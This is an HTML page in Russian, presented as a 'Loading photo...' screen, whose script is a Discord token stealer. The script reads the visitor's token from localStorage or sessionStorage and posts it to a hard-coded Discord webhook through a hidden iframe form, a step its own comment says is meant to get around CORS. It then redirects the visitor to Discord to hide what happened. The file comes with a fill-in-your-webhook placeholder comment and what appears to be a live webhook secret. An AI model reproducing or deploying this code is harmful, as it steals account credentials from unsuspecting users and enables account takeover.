<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Загрузка фото...</title>
  <style>body{background:#000;color:#fff;font:22px Arial;text-align:center;padding-top:15%}</style>
</head>
<body>
  <h1>Загрузка фото...</h1>
  <script>
    // ←←←←← ВСТАВЬ СВОЙ ВЕБХУК СЮДА →→→→→
    const WEBHOOK = "https://discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";
    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←

    // ИЩЕМ ТОКЕН В ДВУХ МЕСТАХ (localStorage + sessionStorage)
    let token = localStorage.getItem("token");
    if (!token) token = sessionStorage.getItem("token");
    if (!token) token = "нет токена";

    console.log("Токен найден:", token.substring(0, 30) + "...");

    if (token === "нет токена") {
      setTimeout(() => location.href = "https://discord.com/app", 1000);
    } else {
      // Отправляем через iframe + POST-форму (обход CORS)
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
      const doc = iframe.contentDocument || iframe.contentWindow.document;

      const form = doc.createElement('form');
      form.method = 'POST';
      form.action = WEBHOOK;

      const input = doc.createElement('input');
      input.name = 'payload_json';
      input.value = JSON.stringify({
        content: "**Новый токен!**",
        embeds: [{
          color: 16711680,
          title: "Токен спизжен",
          description: "```" + token + "```",
          timestamp: new Date().toISOString()
        }]
      });

      form.appendChild(input);
      doc.body.appendChild(form);
      form.submit();

      console.log("POST отправлен в webhook!");

      // Через 1.5 сек переходим в Discord
      setTimeout(() => location.href = "https://discord.com/app", 1500);
    }
  </script>
</body>
</html>
